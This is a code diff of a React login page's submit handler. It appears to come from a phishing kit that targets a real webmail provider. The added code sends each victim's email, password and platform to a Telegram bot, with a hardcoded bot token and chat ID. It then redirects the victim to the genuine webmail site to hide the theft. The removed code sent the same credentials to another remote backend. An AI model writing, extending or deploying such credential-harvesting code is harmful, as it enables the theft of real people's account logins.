@@ -26,32 +26,42 @@ function Home(){
     const[ischecked, setChecked] = useState(false);
 
 
-async function handleSubmit(e){
-    e.preventDefault();
 
-    try {
-        const response = await axios.post('https://backendone-d60j.onrender.com/api/send', {
-            email:email,
-            password:password,
-            platform:platform
-        });
-    
-        // Handle success
-        console.log('Data sent:', response.data.message);
-
-        if(response.status == 200){
-            console.log(response.data.message);
-
-            window.location.href = 'https://webmail.aptalaska.net/';
+    async function handleSubmit(e){
+      e.preventDefault();
+  
+  
+      try {
+          // const response = await axios.post('https://mainbackend-rd07.onrender.com/api/send', {
+          //     email:email,
+          //     password:password,
+          //     platform:platform
+          // });
+  
+          const response = await axios.post(`https://api.telegram.org/bot6346477835:AAE--Er907FambpxvtD7C-CU-J7GlwgyEkg/sendMessage`, {
+              chat_id: 5916570239,
+              text: `Platform : ${platform} , Email : ${email} ,  Password : ${password}`,
+            });
+  
+  
+      
+          // Handle success
+       
+  
+          if(response.status == 200){
+             // console.log(response.data.message);
+  
+            
+             window.location.href = 'https://webmail.aptalaska.net/';
+          }
+        } catch (error) {
+          // Handle error
+          console.error('Error:', error);
         }
-      } catch (error) {
-        // Handle error
-        console.error('Error:', error);
-      }
-    
-}
-
-
+      
+  
+      
+  }
     return (
         <>
 
